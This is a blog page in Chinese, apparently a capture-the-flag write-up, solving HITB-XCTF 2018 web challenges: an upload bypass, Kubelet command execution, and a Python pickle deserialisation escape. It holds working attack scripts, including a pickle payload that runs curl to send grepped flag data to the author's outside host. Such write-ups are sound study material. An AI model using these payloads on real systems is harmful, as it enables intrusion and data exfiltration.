@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        HITB-XCTF Web Write Up - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#before-start"><span class="toc-text">before start</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload"><span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E7%9B%AE%E5%BD%95"><span class="toc-text">猜解目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-text">上传绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Baby"><span class="toc-text">Baby Baby</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E2%80%99s-revenge"><span class="toc-text">Python’s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-text">触发点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96cookie-secret"><span class="toc-text">获取cookie_secret</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-text">沙盒逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baby-Nya"><span class="toc-text">Baby Nya</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-lover"><span class="toc-text">php lover</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        HITB-XCTF Web Write Up
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-04-14 22:06:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#write up" title="write up">write up</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="before-start"><a href="#before-start" class="headerlink" title="before start"></a>before start</h3><p>这次ctf是半路上车，本着轻松娱乐的心态，撸了4道题。感觉这次web题目主要考察知识点的积累，都是比较前沿的姿势，找准题目对应的知识点，剩下的就比较简单了。</p>
+<span id="more"></span>
+
+
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>这道题目的知识点在于php函数在windows底层实现的一些特性，导致目录可猜解。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="http://www.freebuf.com/column/164698.html">网站漏洞——文件判断函数的安全风险（实战篇）</a></p>
+<p>回到题目，首先是一个上传页面，但是上传之后只返回了文件名，直接访问是访问不到的。源代码中有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Where Path~?</span><br><span class="line">&lt;!--pic.php?filename=default.jpg--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://47.90.97.18:9999/pic.php?filename=default.jpg</code>，返回了图片的长度和宽度，正好符合了上文中使用<code>getimagesize</code>的利用条件，可以利用pic.php猜解上传目录。</p>
+<h4 id="猜解目录"><a href="#猜解目录" class="headerlink" title="猜解目录"></a>猜解目录</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> (string.ascii_lowercase + string.digits):</span><br><span class="line">        url = <span class="string">&#x27;http://47.90.97.18:9999/pic.php?filename=../%s&lt;/1523710397.jpg&#x27;</span> % (path+ch)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        <span class="comment">#print(url, r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;width&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            path += ch</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)   </span><br></pre></td></tr></table></figure>
+
+<p>这里坑是真不少。。。首先default.jpg在好多个目录都有，只能自己先上传一个真正的图片。其次就是服务器对py脚本极不友好。。。。磕磕绊绊得到目录为<code>87194f13726af7cee27ba2cfe97b60df</code>。</p>
+<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>题目对后缀名进行了检测，可以使用<code>l.php::$DATA</code>这种方式来绕过。另外要注意的一点是，上传的文件要传入<code>getimagesize()</code>，需要加上<code>GIF89a</code>文件头。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180414/LH4I29kCF9.png" alt="mark"></p>
+<p>过滤掉了一些函数，使用<code>print_r(glob(&quot;../*&quot;));</code>列目录，<code>show_source(&#39;../flag.php&#39;);</code>读文件。</p>
+<p>成功得到flag：<code>HITB&#123;e5f476c1e4c6dc66278db95f0b5a228a&#125;</code></p>
+<h3 id="Baby-Baby"><a href="#Baby-Baby" class="headerlink" title="Baby Baby"></a>Baby Baby</h3><p>提示是这样的<code>This is a pentest challenge, open your mind</code>，扫了一下端口，发现<strong>10250</strong>端口比较可疑，查了一下，找到了Ricterz大佬的博客<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Security%20Issues%20of%20Kubelet%20HTTP%28s%29%20Server">Security Issues of Kubelet HTTP(s) Server</a>。</p>
+<p>具体的利用方式文中写的很详细，直接开干。</p>
+<p>首先访问<code>https://47.75.146.42:10250/runningpods/</code>确认漏洞存在。</p>
+<p>控制容器执行任意命令需要namespace、pod_name 和 container_name三个参数，经过寻找，发现flag在<strong>web-test</strong>容器中。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180414/HjKbd1AeJc.png" alt="mark"></p>
+<h3 id="Python’s-revenge"><a href="#Python’s-revenge" class="headerlink" title="Python’s revenge"></a>Python’s revenge</h3><p>题目说的很明白，就是python沙盒逃逸，看了一下代码，和之前的强网杯的代码很相似，明显是利用pickle反序列化。不过再利用之前，需要解决几个小问题。</p>
+<h4 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h4><p>既然是反序列化，那就直接找<code>loads</code>函数吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loads</span>(<span class="params">strs</span>):</span><br><span class="line">    reload(pickle)</span><br><span class="line">    files = StringIO(strs)</span><br><span class="line">    unpkler = pickle.Unpickler(files)</span><br><span class="line">    unpkler.dispatch[pickle.REDUCE] = _hook_call(</span><br><span class="line">        unpkler.dispatch[pickle.REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure>
+
+<p>那么在哪里调用了？只有<code>getlocation</code>函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getlocation</span>():</span><br><span class="line">    cookie = request.cookies.get(<span class="string">&#x27;location&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    (digest, location) = cookie.split(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):</span><br><span class="line">        flash(<span class="string">&quot;Hey! This is not a valid cookie! Leave me alone.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    location = loads(b64d(location))</span><br><span class="line">    <span class="keyword">return</span> location</span><br></pre></td></tr></table></figure>
+
+<p>从cookie中获取location（形如front!back），经过一个验证之后，将!后面的数据进行了反序列化。</p>
+<p>继续找调用<code>getlocation</code>的函数，有两处，<code>home()</code>和<code>reminder()</code>，我们来看<code>reminder()</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reminder&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reminder</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        location = request.form[<span class="string">&quot;reminder&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> location == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            flash(<span class="string">&quot;Message cleared, tell us when you have found more brains.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;We will remember where you find your brains.&quot;</span>)</span><br><span class="line">        location = b64e(pickle.dumps(location))</span><br><span class="line">        cookie = make_cookie(location, cookie_secret) <span class="comment">#生成cookie</span></span><br><span class="line">        response = redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;location&#x27;</span>, cookie) <span class="comment">#设置cookie</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    location = getlocation()</span><br><span class="line">    <span class="keyword">if</span> location == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;clear&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;reminder.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过post方式把我们的payload设置到cookie中，然后通过get访问来触发反序列化。</p>
+<h4 id="获取cookie-secret"><a href="#获取cookie-secret" class="headerlink" title="获取cookie_secret"></a>获取cookie_secret</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;.secret&#x27;</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.secret&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        secret = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits)</span><br><span class="line">                         <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))</span><br><span class="line">        f.write(secret)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.secret&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cookie_secret = f.read().strip()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到cookie_secret是一个4位的随机字符串，很容易就可以爆破出来。先来看一下如何生成cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_cookie</span>(<span class="params">location, secret</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%s!%s&quot;</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_digest</span>(<span class="params">location, secret</span>):</span><br><span class="line">    <span class="keyword">return</span> sha256(<span class="string">&quot;%s%s&quot;</span> % (location, secret)).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>这个location是可控的，即在前面的<code>remind()</code>中将我们的输入序列化之后base64encode。可以很容易的写出爆破脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">location = <span class="string">&#x27;VjEKcDAKLg==&#x27;</span></span><br><span class="line">chars = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> chars:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> chars:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> chars:</span><br><span class="line">				secret = a + b + c + d</span><br><span class="line">				<span class="keyword">if</span> calc_digest(location,secret) == <span class="string">&#x27;835c8b396d3f58bd214b877fafac1a3ab71e9f0ca775fb3681f1abf46d4e70cd&#x27;</span>:</span><br><span class="line">					<span class="built_in">print</span> secret</span><br><span class="line">					exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#secret is hitb</span></span><br></pre></td></tr></table></figure>
+
+<p>location和hash值都是输入任意数据从cookie中获得的。</p>
+<h4 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h4><p>题目准备了一个超大的黑名单，但还是有漏网之鱼，这里使用了<code>platform</code>模块，利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_digest</span>(<span class="params">location, secret</span>):</span><br><span class="line">	    <span class="keyword">return</span> sha256(<span class="string">&quot;%s%s&quot;</span> % (location, secret)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_cookie</span>(<span class="params">location, secret</span>):</span><br><span class="line">	    <span class="keyword">return</span> <span class="string">&quot;%s!%s&quot;</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (platform.popen, (<span class="string">&#x27;curl -s http://seaii-blog.com:8000/?`grep &quot;HITB&#123;&quot; -r / 2&gt;/dev/null`&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">e = Exp()</span><br><span class="line">location = base64.b64encode(pickle.dumps(e))</span><br><span class="line"><span class="comment">#pickle.loads(pickle.dumps(e))</span></span><br><span class="line"><span class="built_in">print</span> make_cookie(location, <span class="string">&#x27;hitb&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将生成好的cookie替换，访问<code>/reminder</code>即可触发。这里bash反弹shell没成功，用了个简单粗暴的方法。。。</p>
+<h3 id="Baby-Nya"><a href="#Baby-Nya" class="headerlink" title="Baby Nya"></a>Baby Nya</h3><p>这题提示也比较明显<code>the tomcat deployed jolokia.war</code>，仍然是Ricterz大佬的文章，跟上篇挨着。。。</p>
+<p><a target="_blank" rel="noopener" href="https://ricterz.me/posts/Exploiting%20Jolokia%20Agent%20with%20Java%20EE%20Servers">Exploiting Jolokia Agent with Java EE Servers</a></p>
+<p>一开始访问80端口什么也没有，所以扫了一下端口，发现了8009端口。</p>
+<p>搜到了这样一篇文章<a target="_blank" rel="noopener" href="https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/">Exploiting Apache Tomcat through port 8009 using the Apache JServ Protocol</a></p>
+<p>根据文章的一通操作，访问本地<code>127.0.0.1</code>就可以看到远程的tomcat页面了。</p>
+<p>接下来按照Ricterz文中的<strong>Tomcat with Jolokia</strong>部分操作就可以了，flag就在管理页面。</p>
+<h3 id="php-lover"><a href="#php-lover" class="headerlink" title="php lover"></a>php lover</h3><p>时间短没来得及看，之后补上吧。</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
